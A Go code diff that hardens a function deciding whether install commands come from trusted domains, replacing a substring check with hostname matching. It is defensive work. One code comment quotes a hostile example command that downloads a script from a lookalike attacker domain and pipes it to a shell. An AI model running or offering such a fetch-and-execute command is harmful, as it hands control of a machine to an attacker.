@@ -23,14 +23,39 @@ var trustedDomains = []string{
 
 var safeInstallRe = compile(`(?:pip|npm)\s+install`, regexp2.IgnoreCase)
 
+// urlInTextRe extracts URL authorities from a command string so trust can be
+// decided by hostname rather than substring.
+var urlInTextRe = regexp.MustCompile(`(?i)https?://([^/\s'"]+)`)
+
+// isTrustedSource reports whether every URL host in text belongs to a trusted
+// domain. Hostnames are compared by exact match or proper subdomain suffix —
+// a substring check would let `https://github.com.evil.tld/x.sh | sh` pose as
+// trusted and dodge the install gate.
 func isTrustedSource(text string) bool {
-	low := strings.ToLower(text)
-	for _, d := range trustedDomains {
-		if strings.Contains(low, d) {
-			return true
+	matches := urlInTextRe.FindAllStringSubmatch(text, -1)
+	if len(matches) == 0 {
+		return false
+	}
+	for _, m := range matches {
+		host := strings.ToLower(m[1])
+		if at := strings.LastIndex(host, "@"); at >= 0 {
+			host = host[at+1:] // drop any userinfo
+		}
+		if c := strings.IndexByte(host, ':'); c >= 0 {
+			host = host[:c] // drop any port
+		}
+		trusted := false
+		for _, d := range trustedDomains {
+			if host == d || strings.HasSuffix(host, "."+d) {
+				trusted = true
+				break
+			}
+		}
+		if !trusted {
+			return false
 		}
 	}
-	return false
+	return true
 }
 
 func isSafeSupplyChainPattern(text string) bool {
